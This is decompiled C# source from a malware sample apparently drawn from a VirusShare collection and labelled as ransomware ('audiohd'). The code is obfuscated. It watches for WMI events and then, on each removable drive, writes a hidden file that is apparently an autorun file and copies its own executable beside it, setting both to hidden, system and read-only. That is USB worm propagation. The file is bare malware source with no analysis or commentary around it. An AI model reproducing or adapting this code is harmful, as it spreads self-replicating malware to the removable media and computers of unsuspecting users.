// Decompiled with JetBrains decompiler
// Type: 
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using ___codefort;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

internal sealed class \u0006
{
  private static ManagementEventWatcher \u0002;

  public static void \u0002()
  {
    ManagementScope scope = new ManagementScope(I.\u0002(737969285));
    scope.Options.EnablePrivileges = true;
    try
    {
      \u0006.\u0002 = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
      {
        EventClassName = I.\u0002(737968769),
        WithinInterval = new TimeSpan(0, 0, 3),
        Condition = I.\u0002(737968807)
      });
      \u0006.\u0002.EventArrived += new EventArrivedEventHandler(\u0006.\u0002);
      \u0006.\u0002.Start();
    }
    catch
    {
      if (\u0006.\u0002 == null)
        return;
      \u0006.\u0002.Stop();
    }
  }

  public static void \u0002(object _param0, EventArgs _param1)
  {
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.DriveType == DriveType.Removable)
      {
        try
        {
          if (File.Exists(drive.Name + I.\u0002(737968722)))
            File.Delete(drive.Name + I.\u0002(737968722));
          if (File.Exists(drive.Name + I.\u0002(737968748)))
            File.Delete(drive.Name + I.\u0002(737968748));
        }
        catch
        {
        }
        StreamWriter streamWriter = new StreamWriter(drive.Name + I.\u0002(737968722));
        streamWriter.WriteLine(I.\u0002(737968766));
        streamWriter.WriteLine(I.\u0002(737968654));
        streamWriter.WriteLine(I.\u0002(737968676));
        streamWriter.WriteLine(I.\u0002(737969109));
        streamWriter.WriteLine(I.\u0002(737969122));
        streamWriter.WriteLine(I.\u0002(737969027));
        streamWriter.Close();
        File.SetAttributes(drive.Name + I.\u0002(737968722), File.GetAttributes(drive.Name + I.\u0002(737968722)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        try
        {
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, drive.Name + I.\u0002(737968748));
          File.SetAttributes(drive.Name + I.\u0002(737968748), File.GetAttributes(drive.Name + I.\u0002(737968748)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        }
        finally
        {
          Thread.Sleep(2000);
        }
      }
      if (\u0006.\u0002 != null)
        \u0006.\u0002.Stop();
      \u0006.\u0002.Start();
    }
  }
}
